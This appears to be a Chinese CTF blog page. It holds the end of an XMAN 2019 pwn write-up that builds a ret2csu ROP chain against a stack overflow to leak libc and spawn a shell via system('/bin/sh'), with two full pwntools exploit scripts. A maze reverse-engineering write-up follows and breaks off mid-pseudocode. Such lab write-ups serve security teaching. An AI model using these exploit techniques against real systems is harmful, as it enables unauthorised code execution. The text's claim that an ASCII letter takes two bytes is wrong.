<td align="center">argv[1]</td>
<td align="center">RBX</td>
</tr>
</tbody></table>
<p>从<code>0x0000000000400880</code>到 <code>0x0000000000400886</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, r13</span><br><span class="line">mov     rsi, r14</span><br><span class="line">mov     edi, r15d</span><br></pre></td></tr></table></figure>

<p>我们可以将<code>R13</code> 赋给<code>RDX</code>, 将<code>R14</code>赋给<code>RSI</code>，将<code>R15D</code>赋给 <code>EDI</code>（需要注意的是，虽然这里赋给的是<code>EDI</code>，<strong>但其实此时<code>RDI</code>的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 <code>RDI</code> 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。</p>
<p>也就是说只要我们控制<code>argv[4]</code>, <code>argv[5]</code>,<code>argv[6]</code>，就能分别控制<code>RDX</code>,<code>RSI</code>,<code>RDI</code></p>
<p>此外，如果我们可以合理地控制<code>R12</code> 与 <code>rbx</code>，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 <code>RBX</code>为 0，<code>R12</code>为存储我们想要调用的函数的地址。</p>
<p>控制<code>RBX</code>只需要<code>argv[1]</code>为0即可</p>
<p>在<code>0x000000000040088D</code>通过<code>add     rbx, 1</code></p>
<p>我们可以控制 RBX 与 RBP 的之间的关系为 RBX+1 = RBP，这样我们就不会执行<code>loc_400896</code>，进而可以继续执行下面的程序。</p>
<p>整个程序逻辑是这样的，<code>main</code>函数中，用户可以输入<code>1024</code>个字节，并通过<code>echo</code>函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以<code>x00</code>作为字符串终止符，故如果我们的<code>payload</code>中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用<code>gadget</code>来为<code>write</code>函数传参，故肯定会在payload中包含<code>x00</code>字符。</p>
<p> 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于<code>echo</code>函数的栈空间很小，与<code>main</code>函数栈中的输入字符串之间只间隔<code>32</code>字节，故我们可以利用这一点，只复制过去<code>24</code>字节数据加上一个包含连续4个<code>pop</code>指令的<code>gadget</code>地址，并借助这个<code>gadget</code>跳过原字符串的前32字节数据，我们就进入了<code>main</code>函数的栈，不受终止符的影响，即可进入我们正常的通用<code>gadget</code>调用过程</p>
<p>简单来说就是把之前<code>main</code>栈里的24个<code>a</code>和一个<code>pppr</code>弹出来，接着不就可以之后写个<code>ret</code>，继续构造<code>ROP</code>了</p>
<p>为什么是<code>32</code>个字节我们需要从系统的母函数和子函数的栈帧的分配看起</p>
<table>
<thead>
<tr>
<th align="center">高地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">栈底</td>
</tr>
<tr>
<td align="center">较早的栈帧</td>
</tr>
<tr>
<td align="center">调用者的栈帧</td>
</tr>
<tr>
<td align="center">（被调用者）当前栈帧</td>
</tr>
<tr>
<td align="center">栈顶</td>
</tr>
<tr>
<td align="center">低地址</td>
</tr>
</tbody></table>
<p>在这个情景下，<code>main</code>函数即为调用者，<code>echo</code>函数即为被调用者，即为当前栈帧。我们深入两个栈帧之间</p>
<table>
<thead>
<tr>
<th align="center">……</th>
<th align="center">（main）调用者的栈帧</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[n]</td>
<td align="center">（main）调用者的栈帧</td>
</tr>
<tr>
<td align="center">……</td>
<td align="center">（main）调用者的栈帧</td>
</tr>
<tr>
<td align="center">argv[1]</td>
<td align="center">（main）调用者的栈帧</td>
</tr>
<tr>
<td align="center">return address</td>
<td align="center">（main）调用者的栈帧</td>
</tr>
<tr>
<td align="center">（栈帧底）被保存的EBP</td>
<td align="center">(echo)（被调用者）当前栈帧</td>
</tr>
<tr>
<td align="center">被保存的寄存器、本地变量和临时变量</td>
<td align="center">(echo)（被调用者）当前栈帧</td>
</tr>
<tr>
<td align="center">参数构造区域</td>
<td align="center">(echo)（被调用者）当前栈帧</td>
</tr>
</tbody></table>
<p>当我们通过栈溢出覆盖掉<code>echo</code>的<code>EBP</code>地址栈底后，和上面<code>main</code>函数的栈还差一个<code>return address</code>的长度，我们知道在64位操作系统里面这个值即为<code>8</code>字节，而一个<code>ASCII</code>字母占用<code>2</code>个字节，故调用<code>4</code>次<code>POP</code>，把之前传入的<code>A</code>字母弹出<code>4</code>个，刚好为<code>8</code>个字节就跳到了<code>main</code>函数的参数地址</p>
<p>这里顺便介绍一下通过<code>pattern.py</code>计算64位下的栈溢出点的方法</p>
<p>首先还是一样的先创建出测试字符串</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 300 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure>

<p>老样子通过<code>GDB</code>调试复制粘贴输入</p>
<p>这里需要注意在64位的情况下，因为<code>ret</code>相当于<code>pop rip</code>指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。在<code>GDB</code>里，<code>x</code>是查看内存的指令，随后的<code>gx</code>代表数值用64位16进制显示</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> x/gx $rsp</span><br><span class="line">0x7fffffffda48:	0x6241396141386141</span><br></pre></td></tr></table></figure>

<p>随后我们就可以用pattern.py来计算溢出点</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x6241396141386141hex pattern decoded as: Aa8Aa9Ab</span><br><span class="line">24</span><br></pre></td></tr></table></figure>

<p>和我们看代码分析得到的溢出点一致即为<code>24</code>个字节</p>
<p>则<code>payload1</code>可以这样构造，首先</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br></pre></td></tr></table></figure>

<p>使程序进入main函数的栈里面，然后就是我们正常的ROP构造过程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这时完成的栈和寄存器的对照关系</p>
<table>
<thead>
<tr>
<th align="center">argv[6]</th>
<th align="center">R15</th>
<th align="center">1</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[5]</td>
<td align="center">R14</td>
<td align="center">write_got</td>
</tr>
<tr>
<td align="center">argv[4]</td>
<td align="center">R13</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">argv[3]</td>
<td align="center">R12</td>
<td align="center">write_got</td>
</tr>
<tr>
<td align="center">argv[2]</td>
<td align="center">RBP</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">argv[1]</td>
<td align="center">RBX</td>
<td align="center">0</td>
</tr>
</tbody></table>
<p>然后的payload即为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(movcalladdress)</span><br></pre></td></tr></table></figure>

<p>这时write参数构造完毕，对照关系表有</p>
<table>
<thead>
<tr>
<th align="center">argv[6]</th>
<th align="center">1</th>
<th align="center">R15</th>
<th align="center">EDI(RDI)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[5]</td>
<td align="center">write_got</td>
<td align="center">R14</td>
<td align="center">RSI</td>
</tr>
<tr>
<td align="center">argv[4]</td>
<td align="center">8</td>
<td align="center">R13</td>
<td align="center">RDX</td>
</tr>
</tbody></table>
<p>这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可,使程序返回开始地址，循环利用echo函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br></pre></td></tr></table></figure>

<p>之后收到完成延迟绑定后<code>write</code>函数的真实地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>

<p>即可计算出<code>libc</code>的基地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.address = write_addr-libc.symbols[<span class="string">"write"</span>]</span><br></pre></td></tr></table></figure>

<p>可得到<code>system</code>函数的真实地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br></pre></td></tr></table></figure>

<p>payload2只需要执行<code>system(&quot;/bin/sh&quot;)</code>即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(poprdi) + p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next()) </span><br><span class="line">payload2 += p64(system_addr)</span><br></pre></td></tr></table></figure>

<p>最终的Exploit为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'simple_stackoverflow3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">"./simple_stackoverlow3"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startAddress =    <span class="number">0x0000000000400630</span></span><br><span class="line">movcalladdress =  <span class="number">0x0000000000400880</span><span class="comment">#mov rdx,r13,rsi,r14</span></span><br><span class="line">pop6address =     <span class="number">0x000000000040089A</span><span class="comment">#pop rax,rbx,r12,r13,r14,r15</span></span><br><span class="line">pop4address =     <span class="number">0x000000000040089C</span><span class="comment">#pop r12,r13,r14,r15</span></span><br><span class="line">poprdi =          <span class="number">0x00000000004008A3</span><span class="comment">#pop rdi</span></span><br><span class="line"></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr-libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(poprdi) + p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next()) </span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'simple_stackoverflow3'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(elf.path)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startAddress =    <span class="number">0x0000000000400630</span></span><br><span class="line">movcalladdress =  <span class="number">0x0000000000400880</span><span class="comment">#mov rdx,r13,rsi,r14</span></span><br><span class="line">pop6address =     <span class="number">0x000000000040089A</span><span class="comment">#pop rax,rbx,r12,r13,r14,r15</span></span><br><span class="line">pop4address =     <span class="number">0x000000000040089C</span><span class="comment">#pop r12,r13,r14,r15</span></span><br><span class="line">poprdi =          <span class="number">0x00000000004008A3</span><span class="comment">#pop rdi</span></span><br><span class="line"></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(movcalladdress)</span><br><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br><span class="line">payload1 =  payload1.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = write_addr - (libc.dump(<span class="string">'write'</span>)-libc.dump(<span class="string">'system'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload2 += p64(pop4address)</span><br><span class="line">payload2 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(bss_base) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(movcalladdress)</span><br><span class="line">payload2 += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">payload2 += p64(poprdi)</span><br><span class="line">payload2 += p64(bss_base)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line">payload2 =  payload2.ljust(<span class="number">1024</span>, <span class="string">"C"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome        \n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/08/XMAN-2019-╕ú╓▌-Re-baby-maze/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/08/XMAN-2019-╕ú╓▌-Re-baby-maze/" class="post-title-link" itemprop="url">XMAN-2019-福州-Re-baby_maze</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-08 09:16:45" itemprop="dateCreated datePublished" datetime="2019-08-08T09:16:45-07:00">2019-08-08</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-08-09 00:17:04" itemprop="dateModified" datetime="2019-08-09T00:17:04-07:00">2019-08-09</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>天舒的师傅真的讲的不错，逻辑结构清晰，循序渐进，题目难易适中现在感觉其实逆向工程是很多东西的基础，比如要PWN一道题目，也需要清晰地认识到程序的流程，不只是PWN，现在Web也需要很多的逆向工程的知识。然后其实逆向工程和杂项和密码学结合还是挺深的，或者说逆向工程考的就是基本功，对编程能力和计算机原理的认识，所以我觉得逆向工程十分好玩</p>
<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
<h2 id="baby-maze"><a href="#baby-maze" class="headerlink" title="baby_maze"></a>baby_maze</h2><p>这题是一道和很基础的<strong>迷宫</strong>类型题目</p>
<p>迷宫问题有以下特点: </p>
<ul>
<li>在内存中布置一张 “地图”</li>
<li>将用户输入限制在少数几个字符范围内. </li>
<li>一般只有一个迷宫入口和一个迷宫出口</li>
</ul>
<p>布置的地图可以由可显字符 (比如<code>#</code>和<code>*</code>)组合而成 (这非常明显,  查看字符串基本就知道这是个迷宫题了.), 也可以单纯用不可显的十六进制值进行表示. 可以将地图直接组成一条非常长的字符串,  或是一行一行分开布置. 如果是一行一行分开布置的话, 因为迷宫一般都会比较大, 所以用于按行(注意, 布置并非按顺序布置,  每行都对应一个具体的行号, 你需要确定行号才能还原迷宫地图) 布置迷宫的函数会明显重复多次. </p>
<p>而被限制的字符通常会是一些方便记忆的组合 (不是也没办法), 比如<code>w/s/a/d</code>, <code>h/j/k/l</code>, <code>l/r/u/d</code>这样的类似组合. 当然各个键具体的操作需要经过分析判断 (像那种只用一条字符串表示迷宫的, 就可以用<code>t</code>键表示向右移动<code>12</code>个字符这样). 对于二维的地图, 一般作者都会设置一个<code>X坐标</code>和一个<code>Y坐标</code>用于保存当前位置. 我们也可以根据这个特点来入手分析.</p>
<p>一般情况下, 迷宫是只有 1 个入口和 1 个出口, 像入口在最左上角<code>(0, 0)</code>位置, 而出口在最右下角<code>(max_X, max_Y)</code>处. 但也有可能是出口在迷宫的正中心, 用一个<code>Y</code>字符表示等等. 解答迷宫题的条件也是需要根据具体情况判断的.  </p>
<p>当然迷宫的走法可能不止 1 条, 也有情况是有多条走法, 但是要求某一个走法比如说代价最小. 那么这就可以变相为一个算法问题. </p>
<p>我们首先打开这个程序可以看一下IDA Pro自动生成的反汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401B60();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input:"</span>);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, v4);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401350(v4) &amp;&amp; sub_40145A() )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct!\nFlag is your input"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始我们毫无头绪，只是知道大概是需要分析<code>sub_401350</code>和<code>sub_40145A</code>两个函数</p>
<p>我们先来分析<code>sub_401350</code>这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401350</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a1, <span class="string">"flag&#123;"</span>, <span class="number">5u</span>) || a1[<span class="number">31</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[i + <span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">97</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">119</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">115</span>:</span><br><span class="line">        dword_405060[i] = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span 